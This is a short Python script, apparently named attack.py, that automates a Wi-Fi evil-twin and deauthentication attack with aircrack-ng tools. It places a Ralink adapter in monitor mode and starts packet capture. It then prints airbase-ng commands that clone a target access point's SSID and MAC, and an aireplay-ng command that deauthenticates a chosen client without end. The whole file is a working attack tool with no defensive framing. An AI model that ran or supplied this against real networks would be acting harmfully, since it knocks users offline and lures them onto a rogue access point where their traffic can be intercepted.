import subprocess
import sys

# Runs the bash command in a shell
def executeCommand(bashCommand):
	process = subprocess.Popen(bashCommand.split(), stdout=subprocess.PIPE)
	output, error = process.communicate()

	return output

# Gets name of Ralink wireless adapter
def getWIName():
	# List wireless interfaces
	output = executeCommand("sudo airmon-ng")

	# Get name of Ralink wireless adapter only
	count = 0
	for string in output.split():
	    if "Ralink" in string:
	        newWAindex = count - 2
	    count += 1

	return output.split()[newWAindex]


if (len(sys.argv) != 6):
	print("Usage: python attack.py <AP-name> <AP-MAC-address> <AP-channel-#> [-mac | -ip] <target-MAC/IP>")
	exit()

SSID = sys.argv[1]
macAddress = sys.argv[2]
channel = sys.argv[3]
macOrIP = sys.argv[4]
target = sys.argv[5]

targetOption = " -k "

if "-mac" in macOrIP:
	targetOption = " -c "

executeCommand("sudo airmon-ng start " + getWIName()) # Put wireless interface in monitoring mode

newInterface = getWIName() # Get interface name of new wireless interface in monitor mode

# print("Running Injection Test")
# executeCommand("sudo aireplay-ng --test -e " + SSID + " -a " + macAddress + " " + newInterface)

executeCommand("sudo airodump-ng " + newInterface + " &") # Start packet capture

print("Commands to copy...")
# Create fake AP with same MAC Address and SSID
print("sudo airbase-ng -a " + macAddress + " --essid " + SSID + " -c " + channel + " " + newInterface)
#executeCommand("sudo airbase-ng -a " + macAddress + " --essid " + SSID + " -c " + channel + " " + newInterface + " &")

# Deauthentication
bashCommand = "sudo aireplay-ng --deauth 0 -a " + macAddress + targetOption + target + " " + newInterface
print(bashCommand)
#process = subprocess.Popen(bashCommand.split())
#output, error = process.communicate()
#print ("Deauthenticated user")
